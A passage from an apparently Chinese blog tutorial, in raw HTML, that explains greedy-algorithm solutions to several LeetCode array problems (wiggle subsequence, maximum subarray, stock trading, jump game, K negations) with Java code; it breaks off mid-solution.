color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：先明确题目中摆动序列的概念，要保证大概类似下图的样子：<br> <img src=\"https://img-blog.csdnimg.cn/20210608073011837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 不过要是针对题目中删除元素来获得差值序列这种复杂的描述，我们可以更换一个新的思考方式，见下图：<br> <img src=\"https://img-blog.csdnimg.cn/20210608073352474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 发现了如果存在这种“中间值”，我们需要删掉，来保证数组中的每个元素都属于波峰或者波谷。 什么是波峰波谷呢？顾名思义 波峰就是在各点的两边的元素都比它小， 波谷就是两边都比它大。 这样我们不需要删除元素，仅仅需要忽略过这种不是波峰波谷的值，在扫描数组的时候根据坡度的变化来更新<code>ans</code>就可以咯。<br> <strong>问题抽象：</strong><br> 扫描数组，根据差值确定是否更新<code>ans</code>值。<br> <strong>实现步骤：</strong><br> 1、定义<code>currDiff</code>表示当前元素与上一个元素的差值（也可以理解为坡度）<br> 2、定义<code>prevDiff</code>表示上一个坡度。<br> 3、遍历数组，坡度相反的时候，更新<code>ans</code></p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">wiggleMaxLength</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 上一个坡度， 与 当前坡度初始化</span>\n        <span class=\"token keyword\">int</span> prevDiff <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> currDiff <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            currDiff <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> nums<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 当前坡度与上一个坡度相反，出现波峰或波谷</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>currDiff <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> prevDiff <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>currDiff <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span> 0 <span class=\"token operator\">&amp;</span><span class=\"token operator\">&amp;</span> prevDiff <span class=\"token punctuation\">&gt;</span></span><span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 更新坡度</span>\n                prevDiff <span class=\"token operator\">=</span> currDiff<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 更新答案</span>\n                ans <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>恭喜你距离掌握贪心算法又近了一步～<br> <img src=\"https://img-blog.csdnimg.cn/20210608070814125.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"3httpsleetcodecncomproblemsmaximumsubarray_86\"></a><a href=\"https://leetcode-cn.com/problems/maximum-subarray/\">3.最大子序和</a></h2> \n <blockquote> \n  <p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。<br> <img src=\"https://img-blog.csdnimg.cn/20210608075537142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：<br> 刚刚接触到这道题的时候，我们不难想出下面这样的暴力思维：根据不同的起始位置扫描后面全部数组元素，将最大值随时记录下来，于是就有了下面这种效率很低的暴力代码：</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span>MIN_VALUE<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">int</span> base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        base <span class=\"token operator\">+=</span> nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        ans <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>那么这道题可以优化成贪心的地方在哪里呢？ 仔细观察我们的代码，在外循环每次更新的起始位置效率很低，每次只更新1，如果我们在扫描数组元素的时候根据数组元素的特性更新怎么样呢？ 比如，当计数累加到遇到负数元素时，我们直接放弃当前序列（“拖油瓶”），遍历后面的元素，并对答案保持更新。这样，我们就少了一层确定起始位置的循环。<br> <strong>问题抽象：</strong><br> 一层循环控制数组下标，遍历的同时确定<code>base</code>是否舍弃。<br> <strong>实现步骤：</strong><br> 1、将最大值置为最小的整数值，用来更新后续最大值。<br> 2、扫描数组，<code>base</code>不断累加当前元素。<br> 3、如果<code>base</code>大于最大值，更新<code>ans</code>。<br> 4、如果<code>base</code>累加到负数，立即舍弃“拖油瓶”。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">maxSubArray</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> nums<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化变量</span>\n        <span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span>MIN_VALUE<span class=\"token punctuation\">,</span> base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 计数累加</span>\n            base <span class=\"token operator\">+=</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 时刻更新最大值</span>\n            ans <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 出现拖油瓶 立即舍弃</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>base <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> base <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>恭喜你，更进一步<br> <img src=\"https://img-blog.csdnimg.cn/20210608081716795.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"4IIhttpsleetcodecncomproblemsbesttimetobuyandsellstockii_133\"></a><a href=\"https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/\">4.买卖股票的最佳时机II</a></h2> \n <blockquote> \n  <p>给定一个数组 prices ，其中 prices[i] 是一支给定股票第 i 天的价格。<br> 设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。<br> 注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。<br> <img src=\"https://img-blog.csdnimg.cn/20210608082633770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：<br> 给了股票每天的价格，想要赚钱，那肯定就是便宜的时候买入，涨价了就卖出咯。这个时候，就能看出来当买入(数组元素)小于卖出(数组元素)的时候就能累加到我们的答案中，但是应该什么时候卖呢？<br> [1, 5, 3] 这种情况很显然在跌到3之前，火速先卖出去，赚一波大的<br> 如果存在下面这种情况该怎么卖呢：<br> [1, 3, 5] 存不存在“小的”时候我先存着，等“大了”我在卖出去？我们不难发现，其实是一样的，我们可以在1买入3卖出，同时3买入，5卖出。这样子： [3 - 1 + 5 - 3] = 4 == [5 - 1] 是一样的！！<br> 这样子问题就好办了，我们只需要在上升的时候累加，下降的时候更新什么时候买入就好啦。只要不能卖钱的时候，我们就一直更新最低价格的时候再买入。<br> <strong>问题抽象：</strong><br> 扫描数组，数组元素上升时，做差累加。减少时，更新<code>base</code>。<br> <strong>实现步骤：</strong><br> 1、初始化<code>base</code>，即买入时候的价格。<br> 2、扫描数组，上升时候就卖出。<br> 3、下降的时候更新<code>base</code>，即重置买入的价格。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">maxProfit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> prices<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化</span>\n        <span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> base <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> prices<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 有赚头，火速卖掉</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> base<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                ans <span class=\"token operator\">+=</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> base<span class=\"token punctuation\">;</span>\n                base <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n              <span class=\"token comment\">// 要亏了，不买不买，找到最便宜的时候买</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token comment\">// 注意这个位置，可以直接更新为最新值，因为如果存在比他大的，就直接卖掉了，不需要保持最小。</span>\n                base <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">,</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>恭喜你，掌握了3分之1哦～<br> <img src=\"https://img-blog.csdnimg.cn/20210610224537225.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"5httpsleetcodecncomproblemsjumpgame_175\"></a><a href=\"https://leetcode-cn.com/problems/jump-game/\">5.跳跃游戏</a></h2> \n <blockquote> \n  <p>给定一个非负整数数组 nums ，你最初位于数组的 第一个下标 。<br> 数组中的每个元素代表你在该位置可以跳跃的最大长度。<br> 判断你是否能够到达最后一个下标。<br> <img src=\"https://img-blog.csdnimg.cn/20210608090128733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：<br> 根据题目描述，我们要想跳到终点，需要怎么跳才能跳过去呢？怎么确定一次到底跳几个格子呢？ 这样子想，问题就想复杂了！其实跳到哪里都无所谓，每次跳跃其实都只是获得了你最远能跳到哪里的信息，如图：<br> <img src=\"https://img-blog.csdnimg.cn/20210608091117105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 不难发现通过遍历可以跳到位置的时候每次<strong>更新可以跳到的最远距离</strong>，如果最远距离可以达到最后元素的位置，我们就可以直接返回。<br> <strong>问题抽象：</strong><br> 在可以跳到的最远距离内扫描数组，时刻更新最大距离，满足条件即返回<code>true</code>，如果扫描完，说明最大距离无法达到数组末端，返回<code>false</code>。<br> <strong>实现步骤：</strong><br> 1、初始化最远距离<code>maxDist</code>为<code>nums[0]</code>。<br> 2、在最远距离范围内逐步扫描数组，并更新最远距离。<br> 3、判断如果最远距离大于数组长度，返回<code>true</code>。<br> 4、返回<code>false</code>。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">canJump</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化</span>\n        <span class=\"token keyword\">int</span> maxDist <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> jumpDist <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 最远距离内逐步扫描</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> maxDist<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 判断是否满足条件</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>maxDist <span class=\"token operator\">&gt;=</span> nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 更新最远距离</span>\n            maxDist <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>maxDist<span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>继续努力哦～<br> <img src=\"https://img-blog.csdnimg.cn/20210610224650926.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"6IIhttpsleetcodecncomproblemsjumpgameii_212\"></a><a href=\"https://leetcode-cn.com/problems/jump-game-ii/\">6.跳跃游戏II</a></h2> \n <blockquote> \n  <p>给定一个非负整数数组，你最初位于数组的第一个位置。<br> 数组中的每个元素代表你在该位置可以跳跃的最大长度。<br> 你的目标是使用最少的跳跃次数到达数组的最后一个位置。<br> 假设你总是可以到达数组的最后一个位置。<br> <img src=\"https://img-blog.csdnimg.cn/20210608095049427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：<br> 这道题和上一道题有一点点不一样，要求返回的是最少的跳跃次数。这个时候可让大家绞尽了脑汁，该怎么确定啥时候计数器+1呢；不慌不慌，看看这个图就一目了然啦：<br> <img src=\"https://img-blog.csdnimg.cn/20210608101149810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 不难发现通过遍历可以跳到<strong>当前步数内最远位置</strong>的时候每次<strong>更新步数和下一个步数内可以跳到的最远距离</strong>，如果最远距离可以达到最后元素的位置，我们就可以直接返回。<br> <strong>问题抽象：</strong><br> 逐步扫描，在可以跳到当前步数内的最远距离时，更新步数和下一个步数内可以到达的最远距离，如果最远距离可以到达数组长度，返回步数。<br> <strong>实现步骤：</strong><br> 1、初始化最远距离<code>maxDist</code>为0，当前步数可以跳到的最远距离<code>currDist</code>为0。<br> 2、在<code>currDist</code>范围内更新<code>maxDist</code>，确定下一个步数内的<code>maxDist</code>。<br> 3、到达<code>currDist</code>时候更新步数。判断下一个步之内能否到达终点。<br> 4、返回步数。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">jump</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> nums<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化步数</span>\n        <span class=\"token comment\">// 下一个步数可以到达的最远距离</span>\n        <span class=\"token comment\">// 当前步数内可以到达的最远距离</span>\n        <span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> maxDist <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> currDist <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 当前步数内确定下一步一步之内能跳到的最远距离</span>\n            maxDist <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>maxDist<span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 跳到当前步数能到达的最大位置了</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&gt;=</span> currDist<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 更新步数</span>\n                ans <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 更新下一步能跳到的最远距离</span>\n                currDist <span class=\"token operator\">=</span> maxDist<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 满足条件，返回</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>maxDist <span class=\"token operator\">&gt;=</span> nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>掌握一半啦！你已经超过全世界一半的人啦～</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610224800139.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"7Khttpsleetcodecncomproblemsmaximizesumofarrayafterknegations_260\"></a><a href=\"https://leetcode-cn.com/problems/maximize-sum-of-array-after-k-negations/\">7.K次取反后最大化的数组和</a></h2> \n <blockquote> \n  <p>给定一个整数数组 A，我们只能用以下方法修改该数组：我们选择某个索引 i 并将 A[i] 替换为 -A[i]，然后总共重复这个过程 K 次。（我们可以多次选择同一个索引 i。）<br> 以这种方式修改数组后，返回数组可能的最大和。<br> <img src=\"https://img-blog.csdnimg.cn/2021060811225747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>:</font><br> <strong>问题分析</strong>：<br> 这是一道简单题，根据题目要求，可以对多次同一个索引操作，我们可以知道，如果在一个数组中经过k次取相反数后能够获得最大sum，必须将最小的值进行取相反数。这样子如果是负数，那么sum增大的越多，如果是正数，那么扣除的就越少，我们采用这种贪心的方式后。如果条件是比较复杂的情况该怎么处理呢，下面给出一个较为一般化的例子来分析：<br> [1, -2 , 3, -1, 2, -3] K = 5,首先将这个复杂的数组排序，如图：<br> <img src=\"https://img-blog.csdnimg.cn/20210608112129433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 此时按照我们正常人的思考方式，肯定是将绝对值最大的负数进行反转。如果将所有负数都反转后<code>k</code>还有盈余，这时候就可以对绝对值最小的那个数字进行不断的翻转，以求得最大的<code>sum</code>。思路理清了，后面就是将解法转换成程序语言。<br> <strong>问题抽象：</strong><br> 排序数组后，在<code>k</code>次操作内，如果数组中存在负数，就对最小的负数进行不断取相反数。没有盈余就结束，有盈余就对绝对值最小的数字进行操作。<br> <strong>实现步骤：</strong><br> 1、排序数组<br> 2、<code>k</code>次遍历数组，在范围内将最低值进行取相反数<br> 3、如果有负数，就取相反数。<br> 4、与下一位数的绝对值进行比较，来决定是否更新 <code>index</code></p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">largestSumAfterKNegations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> nums<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token 